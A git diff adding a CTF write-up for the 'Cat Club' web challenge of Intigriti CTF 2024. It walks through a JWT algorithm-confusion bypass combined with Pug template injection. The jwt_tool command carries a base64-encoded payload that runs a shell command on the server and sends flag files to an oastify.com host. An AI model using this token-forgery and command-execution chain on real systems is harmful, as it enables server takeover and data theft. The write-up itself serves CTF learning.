@@ -214,3 +214,219 @@ Let's try to read the `flag.txt` file.
 We have the flag.
 
 **Flag:** `INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}`
+
+## Cat Club
+**Solvers:** 130 <br>
+**Author:** CryptoCat
+
+### Description
+People are always complaining that there's not enough cat pictures on the internet.. Something must be done!! <br>
+![Cat Club](/assets/img/Intigriti-ctf_2024/cat_club.png)
+
+### Solution
+Create a new account and login to view more cat pictures. <br>
+![Cat Club Login](/assets/img/Intigriti-ctf_2024/cat_club_login.png)
+
+Walk through and nothing special except the name of our account is reflected in the page title. Let's check the source code from the challenge provider. <br>
+![Cat Club Source Code](/assets/img/Intigriti-ctf_2024/cat_club_source_code.png)
+
+We can see the file `sanitizer.js` is used to sanitize the username with regex that only allow the letters and numbers. <br>
+```js
+const { BadRequest } = require("http-errors");
+
+function sanitizeUsername(username) {
+    const usernameRegex = /^[a-zA-Z0-9]+$/;
+
+    if (!usernameRegex.test(username)) {
+        throw new BadRequest("Username can only contain letters and numbers.");
+    }
+
+    return username;
+}
+
+module.exports = {
+    sanitizeUsername,
+};
+```
+Let's check the code where the username is reflected in the page title. <br>
+```js
+router.get("/cats", getCurrentUser, (req, res) => {
+    if (!req.user) {
+        return res.redirect("/login?error=Please log in to view the cat gallery");
+    }
+
+    const templatePath = path.join(__dirname, "views", "cats.pug");
+
+    fs.readFile(templatePath, "utf8", (err, template) => {
+        if (err) {
+            return res.render("cats");
+        }
+
+        if (typeof req.user != "undefined") {
+            template = template.replace(/guest/g, req.user);
+        }
+
+        const html = pug.render(template, {
+            filename: templatePath,
+            user: req.user,
+        });
+
+        res.send(html);
+    });
+});
+```
+
+Hmm, it seems like there is an interesting thing here. <br>
+```js
+const html = pug.render(template, {
+            filename: templatePath,
+            user: req.user,
+        });
+```
+
+The username is reflected by the pug template. It seems to be vulnerable to the SSTI attack. Let's check [SSTI HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). Check the pug template. <br>
+![Cat Club Pug Template](/assets/img/Intigriti-ctf_2024/cat_club_pug_template.png)
+
+If now we test out the `#{7*7}` to see if it works. It will not work because the username is sanitized by the `sanitizer.js` file. Let's check the middleware of `getCurrentUser`. <br>
+```js
+function getCurrentUser(req, res, next) {
+    const token = req.cookies.token;
+
+    if (token) {
+        verifyJWT(token)
+            .then((payload) => {
+                req.user = payload.username;
+                res.locals.user = req.user;
+                next();
+            })
+            .catch(() => {
+                req.user = null;
+                res.locals.user = null;
+                next();
+            });
+    } else {
+        req.user = null;
+        res.locals.user = null;
+        next();
+    }
+}
+```
+
+We can see the token is verified by the `verifyJWT` function. Let's check it out. <br>
+```js
+const jwt = require("json-web-token");
+const fs = require("fs");
+const path = require("path");
+
+const privateKey = fs.readFileSync(path.join(__dirname, "..", "private_key.pem"), "utf8");
+const publicKey = fs.readFileSync(path.join(__dirname, "..", "public_key.pem"), "utf8");
+
+function signJWT(payload) {
+    return new Promise((resolve, reject) => {
+        jwt.encode(privateKey, payload, "RS256", (err, token) => {
+            if (err) {
+                return reject(new Error("Error encoding token"));
+            }
+            resolve(token);
+        });
+    });
+}
+
+function verifyJWT(token) {
+    return new Promise((resolve, reject) => {
+        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
+            return reject(new Error("Invalid token format"));
+        }
+
+        jwt.decode(publicKey, token, (err, payload, header) => {
+            if (err) {
+                return reject(new Error("Invalid or expired token"));
+            }
+
+            if (header.alg.toLowerCase() === "none") {
+                return reject(new Error("Algorithm 'none' is not allowed"));
+            }
+
+            resolve(payload);
+        });
+    });
+}
+
+module.exports = { signJWT, verifyJWT };
+```
+
+We can see that if the algorithm is `none`, it will be rejected. What if we can make the algorithm confusion? Look through the internet and found out this site [JWT Algorithm Confusion](https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355). <br>
+
+We can also get the public key from `/jwks.json`. <br>
+```js
+router.get("/jwks.json", async (req, res) => {
+    try {
+        const publicKey = await fsPromises.readFile(path.join(__dirname, "..", "public_key.pem"), "utf8");
+        const publicKeyObj = crypto.createPublicKey(publicKey);
+        const publicKeyDetails = publicKeyObj.export({ format: "jwk" });
+
+        const jwk = {
+            kty: "RSA",
+            n: base64urlEncode(Buffer.from(publicKeyDetails.n, "base64")),
+            e: base64urlEncode(Buffer.from(publicKeyDetails.e, "base64")),
+            alg: "RS256",
+            use: "sig",
+        };
+
+        res.json({ keys: [jwk] });
+    } catch (err) {
+        res.status(500).json({ message: "Error generating JWK" });
+    }
+});
+```
+![Cat Club JWK](/assets/img/Intigriti-ctf_2024/cat_club_jwk.png)
+
+**Let's exploit** <br>
+- First, let's create a script to extract and format the public key from the JWKS endpoint:
+```py
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import base64
+import json
+
+# Get the JWKS data from /jwks.json endpoint
+jwks = {
+    "keys": [{
+        "kty": "RSA",
+        "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMil0s4clcuyYYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQQpathL1zf3_Jk5IsbhE muU728cod12g0cURVFA3j4qMt94OtPqefzh89vljntTuZcQzYcGEtM7X9O9sSmgPuVc0f1N OmUFCasCzdHdjBNmNfhJLVY7iPxFPQGsRu8SsrqRfTSHjj3Rd_JmGlYCzF5ofsp_EOWPY CUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUtLbzJYoWFeY2OY_W+9vZb23xmmgo980A c51csyzgYQDQQLCxw4h9IxGEmWZ-Hdw",
+        "e": "AQAB",
+        "alg": "RS256",
+        "use": "sig"
+    }]
+}
+
+# Extract key components
+key_data = jwks["keys"][0]
+n = int.from_bytes(base64.urlsafe_b64decode(key_data["n"] + "=="), byteorder="big")
+e = int.from_bytes(base64.urlsafe_b64decode(key_data["e"] + "=="), byteorder="big")
+
+# Create RSA public key
+public_key = rsa.RSAPublicNumbers(e, n).public_key()
+
+# Convert to PEM format
+pem_public_key = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+# Save the public key
+with open("public_key.pem", "wb") as f:
+    f.write(pem_public_key)
+```
+
+But the JWT is using `RS256` alg so we need to change to `HS256` and then inject payload into username. <br>
+![Cat Club SSTI](/assets/img/Intigriti-ctf_2024/cat_club_ssti.png)
+
+- Then use jwt_tool to create a malicious token with algorithm confusion:
+```bash
+python3 jwt_tool.py --exploit k -pk public_key.pem "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIHZoZzk4bWxlN21rcTQwZ3lvNHM3MzExZjI2OHh3cmtnLm9hc3RpZnkuY29tYGNhdCAvZmxhZypgJyl9KCl9In0.L8Z5MJNc5VTuBu9w5IFLnE6Slt5H5pJDCd_0xAgstz8"
+```
+
+Check the burp collaborator and we got the flag.
+
+**Flag:** `INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}`
